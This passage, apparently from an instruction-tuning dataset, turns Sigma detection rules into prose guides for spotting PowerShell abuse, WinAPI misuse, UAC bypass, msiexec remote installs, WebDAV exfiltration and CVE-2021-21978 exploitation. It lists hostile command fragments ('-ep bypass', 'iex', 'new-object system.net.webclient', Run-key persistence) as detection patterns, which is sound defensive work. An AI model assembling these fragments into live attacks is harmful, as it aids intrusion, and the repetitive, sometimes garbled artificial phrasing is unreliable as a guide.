    "output": "In order to detect suspicious PowerShell invocation command parameters, you should monitor Windows PowerShell scripts activity, specifically focusing on Script Block Logging, which must be enabled to detect these activities. This monitoring effort targets the identification of potential malicious behavior characterized by specific command parameters and usage patterns that are often associated with malicious activities.\n\nWhen scrutinizing PowerShell script blocks, pay special attention to scripts that contain signs of trying to operate undetected or bypass security measures. These signs include the use of command parameters that aim to hide windows (`-w hidden`), disable warnings or prompts (`-nop`, `-noni`), bypass the execution policy (`-ep bypass`), or execute commands in a covert manner, such as encoding commands or using base64 encoding (`[Convert]::FromBase64String`, `-Enc`).\n\nMoreover, the detection focuses on identifying scripts that attempt to execute code (`iex` or `Invoke-Expression`) dynamically, which is a common technique for executing malicious code fetched from external sources. Also, it checks for scripts attempting to manipulate the system's startup settings through registry modifications (`reg add HKCU\\software\\microsoft\\windows\\currentversion\\run`) to achieve persistence.\n\nThe detection strategy also includes tracking the creation of `WebClient` objects (`new-object system.net.webclient`) and subsequent download attempts, indicative of scripts downloading and potentially executing malicious content from the internet.\n\nHowever, it is equally important to filter out legitimate activities that may mimic these patterns. For instance, scripts involved in the installation or operation of Chocolatey, a legitimate Windows package manager, might be erroneously flagged. Thus, special conditions are applied to exclude detections related to Chocolatey's known installation scripts and warnings, ensuring a focus on genuine threats without producing unnecessary false positives.\n\nIn summary, by closely monitoring for these specific patterns and command uses within PowerShell script blocks, while also excluding known legitimate activities, you effectively enhance the detection of suspicious PowerShell activities that could indicate an adversary's attempt to compromise systems stealthily. This approach is crucial for identifying potential threats early on, based on their tactical employment of PowerShell as leveraged through various MITRE ATT&CK tactics and techniques, without being distracted by benign operations.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious PowerShell invocation command parameters",
      "answer": "In order to detect suspicious PowerShell invocation command parameters, you should monitor Windows PowerShell scripts activity, specifically focusing on Script Block Logging, which must be enabled to detect these activities. This monitoring effort targets the identification of potential malicious behavior characterized by specific command parameters and usage patterns that are often associated with malicious activities.\n\nWhen scrutinizing PowerShell script blocks, pay special attention to scripts that contain signs of trying to operate undetected or bypass security measures. These signs include the use of command parameters that aim to hide windows (`-w hidden`), disable warnings or prompts (`-nop`, `-noni`), bypass the execution policy (`-ep bypass`), or execute commands in a covert manner, such as encoding commands or using base64 encoding (`[Convert]::FromBase64String`, `-Enc`).\n\nMoreover, the detection focuses on identifying scripts that attempt to execute code (`iex` or `Invoke-Expression`) dynamically, which is a common technique for executing malicious code fetched from external sources. Also, it checks for scripts attempting to manipulate the system's startup settings through registry modifications (`reg add HKCU\\software\\microsoft\\windows\\currentversion\\run`) to achieve persistence.\n\nThe detection strategy also includes tracking the creation of `WebClient` objects (`new-object system.net.webclient`) and subsequent download attempts, indicative of scripts downloading and potentially executing malicious content from the internet.\n\nHowever, it is equally important to filter out legitimate activities that may mimic these patterns. For instance, scripts involved in the installation or operation of Chocolatey, a legitimate Windows package manager, might be erroneously flagged. Thus, special conditions are applied to exclude detections related to Chocolatey's known installation scripts and warnings, ensuring a focus on genuine threats without producing unnecessary false positives.\n\nIn summary, by closely monitoring for these specific patterns and command uses within PowerShell script blocks, while also excluding known legitimate activities, you effectively enhance the detection of suspicious PowerShell activities that could indicate an adversary's attempt to compromise systems stealthily. This approach is crucial for identifying potential threats early on, based on their tactical employment of PowerShell as leveraged through various MITRE ATT&CK tactics and techniques, without being distracted by benign operations."
    }
  },
  {
    "instruction": "Please help me detect the following: use of WinAPI Functions in PowerShell scripts",
    "context": "",
    "output": "Sure!\nIn order to detect the use of WinAPI functions in PowerShell scripts, you should focus on monitoring Windows script activity, specifically PowerShell scripts. The detection approach requires Script Block Logging to be enabled. Look for PowerShell script contents that contain any of the following suspicious function calls: 'AddSecurityPackage', 'AdjustTokenPrivileges', 'CloseHandle', 'CreateProcessWithToken', 'CreateRemoteThread', 'CreateThread', 'CreateUserThread', 'DangerousGetHandle', 'DuplicateTokenEx', 'EnumerateSecurityPackages', 'FreeLibrary', 'GetDelegateForFunctionPointer', 'GetLogonSessionData', 'GetModuleHandle', 'GetProcAddress', 'GetProcessHandle', 'GetTokenInformation', 'ImpersonateLoggedOnUser', 'kernel32', 'LoadLibrary', 'memcpy', 'MiniDumpWriteDump', 'msvcrt', 'ntdll', 'OpenDesktop', 'OpenProcess', 'OpenProcessToken', 'OpenThreadToken', 'OpenWindowStation', 'QueueUserApc', 'ReadProcessMemory', 'RevertToSelf', 'RtlCreateUserThread', 'secur32', 'SetThreadToken', 'VirtualAlloc', 'VirtualFree', 'VirtualProtect', 'WaitForSingleObject', 'WriteInt32', 'WriteProcessMemory', and 'ZeroFreeGlobalAllocUnicode'. Note that scripts starting with a specific copyright line related to Amazon.com, Inc., or those that include certain function imports from 'KernelBase.dll' related to Amazon AWS scripts, should be considered as potential legitimate uses and therefore may be excluded from alerts to reduce false positives. Additionally, be aware of other known benign uses, such as the Carbon PowerShell Module, which might also contribute to false positives. This monitoring is crucial as the aforementioned function calls in PowerShell scripts could indicate attempts to abuse Windows APIs for malicious purposes such as privilege escalation, executing code, and other unauthorized actions on the system.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "use of WinAPI Functions in PowerShell scripts",
      "answer": "In order to detect the use of WinAPI functions in PowerShell scripts, you should focus on monitoring Windows script activity, specifically PowerShell scripts. The detection approach requires Script Block Logging to be enabled. Look for PowerShell script contents that contain any of the following suspicious function calls: 'AddSecurityPackage', 'AdjustTokenPrivileges', 'CloseHandle', 'CreateProcessWithToken', 'CreateRemoteThread', 'CreateThread', 'CreateUserThread', 'DangerousGetHandle', 'DuplicateTokenEx', 'EnumerateSecurityPackages', 'FreeLibrary', 'GetDelegateForFunctionPointer', 'GetLogonSessionData', 'GetModuleHandle', 'GetProcAddress', 'GetProcessHandle', 'GetTokenInformation', 'ImpersonateLoggedOnUser', 'kernel32', 'LoadLibrary', 'memcpy', 'MiniDumpWriteDump', 'msvcrt', 'ntdll', 'OpenDesktop', 'OpenProcess', 'OpenProcessToken', 'OpenThreadToken', 'OpenWindowStation', 'QueueUserApc', 'ReadProcessMemory', 'RevertToSelf', 'RtlCreateUserThread', 'secur32', 'SetThreadToken', 'VirtualAlloc', 'VirtualFree', 'VirtualProtect', 'WaitForSingleObject', 'WriteInt32', 'WriteProcessMemory', and 'ZeroFreeGlobalAllocUnicode'. Note that scripts starting with a specific copyright line related to Amazon.com, Inc., or those that include certain function imports from 'KernelBase.dll' related to Amazon AWS scripts, should be considered as potential legitimate uses and therefore may be excluded from alerts to reduce false positives. Additionally, be aware of other known benign uses, such as the Carbon PowerShell Module, which might also contribute to false positives. This monitoring is crucial as the aforementioned function calls in PowerShell scripts could indicate attempts to abuse Windows APIs for malicious purposes such as privilege escalation, executing code, and other unauthorized actions on the system."
    }
  },
  {
    "instruction": "How can I detect: Adversaries may use to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.",
    "context": "",
    "output": "In order to interact with a remote network share using Server Message Block (SMB), performing actions as the logged-on user, you should: pay attention to logs from Windows systems where Script Block Logging is enabled. Specifically, look for PowerShell script blocks that contain the sequence of commands indicative of a new persistent drive being created with a focus on the filesystem. This action is characterized by the use of 'New-PSDrive' followed by the parameter '-psprovider' specifying 'filesystem' as the type, and evidence that the root of this new drive is pointing to a UNC path (network share) as indicated by the syntax '-root' followed by a path starting with '\\\\\\\\' and ending with a '$' symbol. Such activity may suggest an adversary's attempt to gain access to network resources under the guise of the currently logged-in user, which is a behavior often associated with the tactics of Persistence, Privilege Escalation, and Lateral Movement.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Adversaries may use to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.",
      "answer": "In order to interact with a remote network share using Server Message Block (SMB), performing actions as the logged-on user, you should: pay attention to logs from Windows systems where Script Block Logging is enabled. Specifically, look for PowerShell script blocks that contain the sequence of commands indicative of a new persistent drive being created with a focus on the filesystem. This action is characterized by the use of 'New-PSDrive' followed by the parameter '-psprovider' specifying 'filesystem' as the type, and evidence that the root of this new drive is pointing to a UNC path (network share) as indicated by the syntax '-root' followed by a path starting with '\\\\\\\\' and ending with a '$' symbol. Such activity may suggest an adversary's attempt to gain access to network resources under the guise of the currently logged-in user, which is a behavior often associated with the tactics of Persistence, Privilege Escalation, and Lateral Movement."
    }
  },
  {
    "instruction": "Please help me detect the following: usage of the \"Import-Module\" cmdlet to load the \"Microsoft.ActiveDirectory.Management.dl\" DLL. Which is often used by attackers to perform AD enumeration.",
    "context": "",
    "output": "Sure!\nIn order to detect usage of the \"Import-Module\" cmdlet to load the \"Microsoft.ActiveDirectory.Management.dll\" DLL, which is often used by attackers to perform AD enumeration, you should: Focus on PowerShell scripts on Windows platforms, as this is where the detection mechanism is applied. The primary requirement for this detection to work is that Script Block Logging must be enabled. This allows for monitoring and capturing of PowerShell script execution, which is crucial for detecting the specific behavior.\n\nThe detection strategy involves looking for scripts that contain the 'Import-Module ' command, specifically targeting the loading of the 'Microsoft.ActiveDirectory.Management.dll'. This is a clear indicator that a script is attempting to use functionalities related to Active Directory, which can be benign in administrative contexts but potentially malicious if used by attackers for enumeration purposes. The detection is divided into two parts:\n\n1. A generic selection that searches for sequences containing both 'Import-Module ' and 'Microsoft.ActiveDirectory.Management.dll' within the same script block.\n2. A more specific selection that looks for the exact phrase 'ipmo Microsoft.ActiveDirectory.Management.dll', which is a shorthand for 'Import-Module'.\n\nThe rule is designed to trigger an alert if any one of these conditions is met, indicating potential AD enumeration activity. However, it is critical to consider the context, as the use of 'Microsoft.ActiveDirectory.Management.dll' can be perfectly legitimate for administrative tasks. Therefore, while the detection is geared towards identifying suspicious activity, it's set at a medium level of confidence due to the possible legitimate use of the library, which is identified as a common false positive scenario.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "usage of the \"Import-Module\" cmdlet to load the \"Microsoft.ActiveDirectory.Management.dl\" DLL. Which is often used by attackers to perform AD enumeration.",
      "answer": "In order to detect usage of the \"Import-Module\" cmdlet to load the \"Microsoft.ActiveDirectory.Management.dll\" DLL, which is often used by attackers to perform AD enumeration, you should: Focus on PowerShell scripts on Windows platforms, as this is where the detection mechanism is applied. The primary requirement for this detection to work is that Script Block Logging must be enabled. This allows for monitoring and capturing of PowerShell script execution, which is crucial for detecting the specific behavior.\n\nThe detection strategy involves looking for scripts that contain the 'Import-Module ' command, specifically targeting the loading of the 'Microsoft.ActiveDirectory.Management.dll'. This is a clear indicator that a script is attempting to use functionalities related to Active Directory, which can be benign in administrative contexts but potentially malicious if used by attackers for enumeration purposes. The detection is divided into two parts:\n\n1. A generic selection that searches for sequences containing both 'Import-Module ' and 'Microsoft.ActiveDirectory.Management.dll' within the same script block.\n2. A more specific selection that looks for the exact phrase 'ipmo Microsoft.ActiveDirectory.Management.dll', which is a shorthand for 'Import-Module'.\n\nThe rule is designed to trigger an alert if any one of these conditions is met, indicating potential AD enumeration activity. However, it is critical to consider the context, as the use of 'Microsoft.ActiveDirectory.Management.dll' can be perfectly legitimate for administrative tasks. Therefore, while the detection is geared towards identifying suspicious activity, it's set at a medium level of confidence due to the possible legitimate use of the library, which is identified as a common false positive scenario."
    }
  },
  {
    "instruction": "Can you explain how to detect: pattern of UAC Bypass using DismHost DLL hijacking (UACMe 63)",
    "context": "",
    "output": "Certainly!\n\nIn order to detect the pattern of UAC Bypass using DismHost DLL hijacking (UACMe 63), you should monitor the creation of processes on Windows systems, specifically focusing on instances where DismHost.exe is launched from a path within a user's AppData\\Local\\Temp directory with the parent process image path also being within the C:\\Users\\ directory. Take special note if these processes are launched with 'High' or 'System' integrity levels, as this could indicate an attempt at privilege escalation through UAC bypass utilizing DLL hijacking techniques associated with UACMe method #63. This scenario requires heightened attention due to its suspicious nature and the potential for false positives is acknowledged but unspecified, reflecting the unique aspects of this sophisticated attack technique.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "pattern of UAC Bypass using DismHost DLL hijacking (UACMe 63)",
      "answer": "In order to detect the pattern of UAC Bypass using DismHost DLL hijacking (UACMe 63), you should monitor the creation of processes on Windows systems, specifically focusing on instances where DismHost.exe is launched from a path within a user's AppData\\Local\\Temp directory with the parent process image path also being within the C:\\Users\\ directory. Take special note if these processes are launched with 'High' or 'System' integrity levels, as this could indicate an attempt at privilege escalation through UAC bypass utilizing DLL hijacking techniques associated with UACMe method #63. This scenario requires heightened attention due to its suspicious nature and the potential for false positives is acknowledged but unspecified, reflecting the unique aspects of this sophisticated attack technique."
    }
  },
  {
    "instruction": "Please help me detect the following: A General detection for WebDav user-agent being used to PUT files on a WebDav network share. This could be an indicator of exfiltration.",
    "context": "",
    "output": "Sure!\nIn order to detect a scenario where a WebDav user-agent is being used to PUT files on a WebDav network share, which could indicate data exfiltration, you should observe network traffic logs generated by Zeek that are specifically related to HTTP protocols. Look for instances where the User-Agent string contains 'WebDAV' in combination with the HTTP method 'PUT,' indicating an attempt to upload or modify files on a server.\n\nHowever, to reduce false alarms and avoid detecting benign activity within your organizational network, you should exclude any activity that originates from IP addresses within the private address space, namely 192.168.0.0/16, 172.16.0.0/12, and 10.0.0.0/8. This ensures that only potentially malicious external activities are considered.\n\nKeep in mind that while this detection strategy is important for spotting potential data exfiltration attempts using WebDav, there is a possibility of encountering activities that might not be malicious (unknown false positives). Therefore, the confidence level for alerts generated based on these criteria is rated low, suggesting that further investigation is necessary to confirm malicious intent.\n\nThe underlying motive for this detection strategy aligns with identifying tactics and techniques such as 'Exfiltration Over Alternative Protocol' which might be employed by attackers to move data out of the network surreptitiously.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "A General detection for WebDav user-agent being used to PUT files on a WebDav network share. This could be an indicator of exfiltration.",
      "answer": "In order to detect a scenario where a WebDav user-agent is being used to PUT files on a WebDav network share, which could indicate data exfiltration, you should observe network traffic logs generated by Zeek that are specifically related to HTTP protocols. Look for instances where the User-Agent string contains 'WebDAV' in combination with the HTTP method 'PUT,' indicating an attempt to upload or modify files on a server.\n\nHowever, to reduce false alarms and avoid detecting benign activity within your organizational network, you should exclude any activity that originates from IP addresses within the private address space, namely 192.168.0.0/16, 172.16.0.0/12, and 10.0.0.0/8. This ensures that only potentially malicious external activities are considered.\n\nKeep in mind that while this detection strategy is important for spotting potential data exfiltration attempts using WebDav, there is a possibility of encountering activities that might not be malicious (unknown false positives). Therefore, the confidence level for alerts generated based on these criteria is rated low, suggesting that further investigation is necessary to confirm malicious intent.\n\nThe underlying motive for this detection strategy aligns with identifying tactics and techniques such as 'Exfiltration Over Alternative Protocol' which might be employed by attackers to move data out of the network surreptitiously."
    }
  },
  {
    "instruction": "How can I detect: deactivation and disabling of the Scheduled defragmentation task as seen by Slingshot APT group",
    "context": "",
    "output": "In order to detect the deactivation and disabling of the Scheduled defragmentation task as seen by Slingshot APT group, you should: Monitor Windows security logs, specifically for Event ID 4701, which is indicative of a task scheduling action. Pay close attention to any modifications involving the \u201c\\Microsoft\\Windows\\Defrag\\ScheduledDefrag\u201d task. This specific task is related to the automated defragmentation of a Windows system's drives, and alterations to its schedule could be a tactic used by attackers, like the Slingshot APT group, to reduce system performance or evade detection mechanisms that rely on the predictable performance of the system. Any unexpected activity regarding this task, especially its deactivation or disabling, should be treated with suspicion. This monitoring requires the system's audit policy to be configured to log 'Audit Other Object Access Events' successfully. While encountering such an event could potentially be benign, it could also indicate malicious activity, with very few known legitimate reasons for such an alteration to occur.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "deactivation and disabling of the Scheduled defragmentation task as seen by Slingshot APT group",
      "answer": "In order to detect the deactivation and disabling of the Scheduled defragmentation task as seen by Slingshot APT group, you should: Monitor Windows security logs, specifically for Event ID 4701, which is indicative of a task scheduling action. Pay close attention to any modifications involving the \u201c\\Microsoft\\Windows\\Defrag\\ScheduledDefrag\u201d task. This specific task is related to the automated defragmentation of a Windows system's drives, and alterations to its schedule could be a tactic used by attackers, like the Slingshot APT group, to reduce system performance or evade detection mechanisms that rely on the predictable performance of the system. Any unexpected activity regarding this task, especially its deactivation or disabling, should be treated with suspicion. This monitoring requires the system's audit policy to be configured to log 'Audit Other Object Access Events' successfully. While encountering such an event could potentially be benign, it could also indicate malicious activity, with very few known legitimate reasons for such an alteration to occur."
    }
  },
  {
    "instruction": "Can you explain how to detect: execution of a renamed \"Msdt.exe\" binary",
    "context": "",
    "output": "Certainly!\n\nIn order to detect the execution of a renamed \"Msdt.exe\" binary, you should: Monitor the process creation logs on Windows systems for any instances where the original file name is recorded as \"msdt.exe,\" but the actual image path does not end with \"\\msdt.exe.\" This approach aims to catch scenarios where the \"Msdt.exe\" binary might have been renamed to avoid detection. Given the specificity of these conditions, it's considered unlikely to encounter false positives, and the detection confidence level is high. Defense strategies should focus on identifying these renamed instances, as it's a tactic often employed to conceal malicious activities.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of a renamed \"Msdt.exe\" binary",
      "answer": "In order to detect the execution of a renamed \"Msdt.exe\" binary, you should: Monitor the process creation logs on Windows systems for any instances where the original file name is recorded as \"msdt.exe,\" but the actual image path does not end with \"\\msdt.exe.\" This approach aims to catch scenarios where the \"Msdt.exe\" binary might have been renamed to avoid detection. Given the specificity of these conditions, it's considered unlikely to encounter false positives, and the detection confidence level is high. Defense strategies should focus on identifying these renamed instances, as it's a tactic often employed to conceal malicious activities."
    }
  },
  {
    "instruction": "Please help me detect the following: usage of Msiexec.exe to install packages hosted remotely quietly",
    "context": "",
    "output": "Sure!\nIn order to detect usage of Msiexec.exe to install packages hosted remotely quietly, you should monitor for the execution of Msiexec.exe in Windows process creation logs. Specifically, look out for instances where the executable's name ends with '\\msiexec.exe' or where the original file name is exactly 'msiexec.exe'. Further examination should focus on the command line arguments used with Msiexec.exe, paying attention to instances where installation ('/i' or '-i'), package operations ('/package' or '-package'), admin installation ('/a' or '-a'), advertisement ('/j' or '-j'), or quiet mode ('/q' or '-q') parameters are present. Additionally, it's crucial to scan for command lines that include remote source indicators such as 'http' or double backslashes ('\\\\\\\\') which typically signify a network path. The detection of these specific elements in combination is indicative of potentially malicious activity aimed at evading defense mechanisms by quietly installing software packages from remote locations, which aligns with MITRE ATT&CK tactics and techniques related to Defense Evasion and specifically identified as Technique T1218.007.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "usage of Msiexec.exe to install packages hosted remotely quietly",
      "answer": "In order to detect usage of Msiexec.exe to install packages hosted remotely quietly, you should monitor for the execution of Msiexec.exe in Windows process creation logs. Specifically, look out for instances where the executable's name ends with '\\msiexec.exe' or where the original file name is exactly 'msiexec.exe'. Further examination should focus on the command line arguments used with Msiexec.exe, paying attention to instances where installation ('/i' or '-i'), package operations ('/package' or '-package'), admin installation ('/a' or '-a'), advertisement ('/j' or '-j'), or quiet mode ('/q' or '-q') parameters are present. Additionally, it's crucial to scan for command lines that include remote source indicators such as 'http' or double backslashes ('\\\\\\\\') which typically signify a network path. The detection of these specific elements in combination is indicative of potentially malicious activity aimed at evading defense mechanisms by quietly installing software packages from remote locations, which aligns with MITRE ATT&CK tactics and techniques related to Defense Evasion and specifically identified as Technique T1218.007."
    }
  },
  {
    "instruction": "Please help me detect the following: Obfuscated Powershell via use MSHTA in Scripts",
    "context": "",
    "output": "Sure!\nIn order to detect obfuscated PowerShell via use MSHTA in scripts, you should monitor Windows PowerShell script log sources, particularly focusing on Script Block Logging, which must be enabled for detection. Specifically, look for script blocks that contain all the following characteristics: the use of 'set', the logical AND operator '&&', the keyword 'mshta', the command for creating an object 'vbscript:createobject', the method '.run', and the script '(window.close)'. These specific patterns suggest an attempt to obfuscate the malicious script's true purpose, possibly by leveraging MSHTA (Microsoft HTML Application Host) to execute scripts outside the standard PowerShell environment. Such tactics are indicative of a sophisticated attack attempting to bypass detection mechanisms. It's crucial to note, however, that there may be unknown cases where these patterns might emerge in non-malicious contexts, indicating potential for false positives. Given the high level of threat this activity represents, any detection of these script characteristics should be prioritized and investigated promptly.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Obfuscated Powershell via use MSHTA in Scripts",
      "answer": "In order to detect obfuscated PowerShell via use MSHTA in scripts, you should monitor Windows PowerShell script log sources, particularly focusing on Script Block Logging, which must be enabled for detection. Specifically, look for script blocks that contain all the following characteristics: the use of 'set', the logical AND operator '&&', the keyword 'mshta', the command for creating an object 'vbscript:createobject', the method '.run', and the script '(window.close)'. These specific patterns suggest an attempt to obfuscate the malicious script's true purpose, possibly by leveraging MSHTA (Microsoft HTML Application Host) to execute scripts outside the standard PowerShell environment. Such tactics are indicative of a sophisticated attack attempting to bypass detection mechanisms. It's crucial to note, however, that there may be unknown cases where these patterns might emerge in non-malicious contexts, indicating potential for false positives. Given the high level of threat this activity represents, any detection of these script characteristics should be prioritized and investigated promptly."
    }
  },
  {
    "instruction": "How to detect: potential malicious and unauthorized usage of bcdedit.exe",
    "context": "",
    "output": "In order to detect potential malicious and unauthorized usage of bcdedit.exe, you should: Focus on monitoring process creation within Windows environments, specifically looking for instances where the process image ends with '\\bcdedit.exe' or the original file name matches 'bcdedit.exe'. Moreover, pay attention to the command line arguments used with bcdedit.exe, particularly if they include 'delete', 'deletevalue', 'import', 'safeboot', or 'network'. The detection requires both the image criteria and command line patterns to match, indicating a medium-level threat. This monitoring approach helps in recognizing possible misuse of bcdedit.exe that could indicate an attacker attempting to modify boot configuration data, potentially to disable security settings or enable alternate boot methods for persistence.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "potential malicious and unauthorized usage of bcdedit.exe",
      "answer": "In order to detect potential malicious and unauthorized usage of bcdedit.exe, you should: Focus on monitoring process creation within Windows environments, specifically looking for instances where the process image ends with '\\bcdedit.exe' or the original file name matches 'bcdedit.exe'. Moreover, pay attention to the command line arguments used with bcdedit.exe, particularly if they include 'delete', 'deletevalue', 'import', 'safeboot', or 'network'. The detection requires both the image criteria and command line patterns to match, indicating a medium-level threat. This monitoring approach helps in recognizing possible misuse of bcdedit.exe that could indicate an attacker attempting to modify boot configuration data, potentially to disable security settings or enable alternate boot methods for persistence."
    }
  },
  {
    "instruction": "Can you explain how to detect: creation of files with the \".one\"/\".onepkg\" extension in suspicious or uncommon locations. This could be a sign of attackers abusing OneNote attachments",
    "context": "",
    "output": "Certainly!\n\nIn order to detect the creation of files with the \".one\"/\".onepkg\" extension in suspicious or uncommon locations, which could be a sign of attackers abusing OneNote attachments, you should: Monitor file event logs on Windows for the creation of files that have the extensions \".one\" or \".onepkg\". Specifically, watch for these files being created in paths that are not typical for standard operations, including \"\\AppData\\Local\\Temp\\\", \"\\Users\\Public\\\", \"\\Windows\\Temp\\\", and \"C:\\Temp\\\". The detection of such activity at these paths can indicate a potential misuse of OneNote files, which might be leveraged by attackers. Be aware that there can be legitimate reasons for these types of files to be located in these directories, so consider this when investigating potential incidents. The severity of this rule is considered medium.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "creation of files with the \".one\"/\".onepkg\" extension in suspicious or uncommon locations. This could be a sign of attackers abusing OneNote attachments",
      "answer": "In order to detect the creation of files with the \".one\"/\".onepkg\" extension in suspicious or uncommon locations, which could be a sign of attackers abusing OneNote attachments, you should: Monitor file event logs on Windows for the creation of files that have the extensions \".one\" or \".onepkg\". Specifically, watch for these files being created in paths that are not typical for standard operations, including \"\\AppData\\Local\\Temp\\\", \"\\Users\\Public\\\", \"\\Windows\\Temp\\\", and \"C:\\Temp\\\". The detection of such activity at these paths can indicate a potential misuse of OneNote files, which might be leveraged by attackers. Be aware that there can be legitimate reasons for these types of files to be located in these directories, so consider this when investigating potential incidents. The severity of this rule is considered medium."
    }
  },
  {
    "instruction": "Explain how should I detect the following: potential evasion or obfuscation attempts using bogus path traversal via the commandline",
    "context": "",
    "output": "In order to detect potential evasion or obfuscation attempts using bogus path traversal via the commandline, you should: Monitor the creation of processes on Windows systems, specifically observing the command lines used to initiate these processes. Look for command lines that contain segments attempting to traverse directories in a suspicious manner. This involves detecting command lines that include paths trying to navigate upwards in the directory structure (`\\..\\`, `\\..\\..\\`) and then back into critical Windows directories (`\\Windows\\`, `\\System32\\`). Additionally, watch for command lines that append directory traversal patterns (`..\\) directly after executable names (`.exe\\..\\`). However, it's important to exclude command lines related to Google Drive or Citrix, as they might use similar patterns for legitimate purposes. These exclusions help in reducing false positive alerts that might arise from the proper use of Google Drive synchronization and Citrix Virtual Smart Card functionalities.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "potential evasion or obfuscation attempts using bogus path traversal via the commandline",
      "answer": "In order to detect potential evasion or obfuscation attempts using bogus path traversal via the commandline, you should: Monitor the creation of processes on Windows systems, specifically observing the command lines used to initiate these processes. Look for command lines that contain segments attempting to traverse directories in a suspicious manner. This involves detecting command lines that include paths trying to navigate upwards in the directory structure (`\\..\\`, `\\..\\..\\`) and then back into critical Windows directories (`\\Windows\\`, `\\System32\\`). Additionally, watch for command lines that append directory traversal patterns (`..\\) directly after executable names (`.exe\\..\\`). However, it's important to exclude command lines related to Google Drive or Citrix, as they might use similar patterns for legitimate purposes. These exclusions help in reducing false positive alerts that might arise from the proper use of Google Drive synchronization and Citrix Virtual Smart Card functionalities."
    }
  },
  {
    "instruction": "Please help me detect the following: exploitation of the VMware View Planner vulnerability described in CVE-2021-21978",
    "context": "",
    "output": "Sure!\nIn order to detect the exploitation of the VMware View Planner vulnerability described in CVE-2021-21978, you should: Focus on webserver logs and look for POST requests that contain 'logupload', 'logMetaData', and 'wsgi_log_upload.py' in the URI query. This activity could indicate an attempt to exploit the vulnerability. You should monitor the client's IP address and DNS name as recorded in the logs to identify the source of the suspicious requests. Be aware that this rule is set at a high level of alert due to the severity of the vulnerability, although unknown false positives could exist.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "exploitation of the VMware View Planner vulnerability described in CVE-2021-21978",
      "answer": "In order to detect the exploitation of the VMware View Planner vulnerability described in CVE-2021-21978, you should: Focus on webserver logs and look for POST requests that contain 'logupload', 'logMetaData', and 'wsgi_log_upload.py' in the URI query. This activity could indicate an attempt to exploit the vulnerability. You should monitor the client's IP address and DNS name as recorded in the logs to identify the source of the suspicious requests. Be aware that this rule is set at a high level of alert due to the severity of the vulnerability, although unknown false positives could exist."
    }
  },
  {
    "instruction": "How can I detect: calls to \"Add-Content\" cmdlet in order to modify the content of the user profile and potentially adding suspicious commands for persistence",
    "context": "",
    "output": "In order to detect calls to \"Add-Content\" cmdlet in order to modify the content of the user profile and potentially adding suspicious commands for persistence, you should: Focus on monitoring PowerShell script activities within Windows environments where Script Block Logging is enabled. Specifically, look for instances where the 'Add-Content' cmdlet is used alongside the PowerShell profile variable ('$profile'). This usage can indicate an attempt to persistently embed malicious scripts or commands within a user\u2019s PowerShell profile. Additionally, be vigilant for the inclusion of suspicious commands that might accompany the 'Add-Content' cmdlet, such as 'Invoke-Expression (IEX)', 'Invoke-WebRequest', and 'Start-Process'. These commands, especially when embedded within a profile, could be utilized to execute malicious code every time the PowerShell session is initiated. While being watchful for these indicators, it's vital to consider that not all uses of these commands are malicious. Legitimate administrative tasks may occasionally employ these methods for benign purposes such as script automation or configuration adjustments. Therefore, while these detections are crucial for identifying potential attacks that attempt to gain persistence on a system through PowerShell profiles, it is equally important to validate alerts contextually to minimize false positives.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "calls to \"Add-Content\" cmdlet in order to modify the content of the user profile and potentially adding suspicious commands for persistence",
      "answer": "In order to detect calls to \"Add-Content\" cmdlet in order to modify the content of the user profile and potentially adding suspicious commands for persistence, you should: Focus on monitoring PowerShell script activities within Windows environments where Script Block Logging is enabled. Specifically, look for instances where the 'Add-Content' cmdlet is used alongside the PowerShell profile variable ('$profile'). This usage can indicate an attempt to persistently embed malicious scripts or commands within a user\u2019s PowerShell profile. Additionally, be vigilant for the inclusion of suspicious commands that might accompany the 'Add-Content' cmdlet, such as 'Invoke-Expression (IEX)', 'Invoke-WebRequest', and 'Start-Process'. These commands, especially when embedded within a profile, could be utilized to execute malicious code every time the PowerShell session is initiated. While being watchful for these indicators, it's vital to consider that not all uses of these commands are malicious. Legitimate administrative tasks may occasionally employ these methods for benign purposes such as script automation or configuration adjustments. Therefore, while these detections are crucial for identifying potential attacks that attempt to gain persistence on a system through PowerShell profiles, it is equally important to validate alerts contextually to minimize false positives."
    }
  },
  {
    "instruction": "How to detect: when storage bucket is enumerated in Google Cloud.",
    "context": "",
    "output": "In order to Detects when storage bucket is enumerated in Google Cloud, you should: Monitor Google Cloud audit logs focusing on activities related to storage buckets. Look for the execution of methods 'storage.buckets.list' and 'storage.buckets.listChannels' within these logs. These activities are indicative of someone attempting to enumerate the contents or channels of storage buckets. While this can sometimes be a benign operation carried out by system administrators, it is important to verify the context in which these methods were called. This involves checking the user identity, user agent, and the hostname to ensure they are legitimate and should have access to perform these operations in your environment. Activities from unfamiliar users or sources should raise suspicions and warrant further investigation. Given the low incidence of malicious intent generally associated with this behavior, keep in mind that it's possible to encounter false positives, such as a legitimate administrative task that may trigger this detection.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "when storage bucket is enumerated in Google Cloud.",
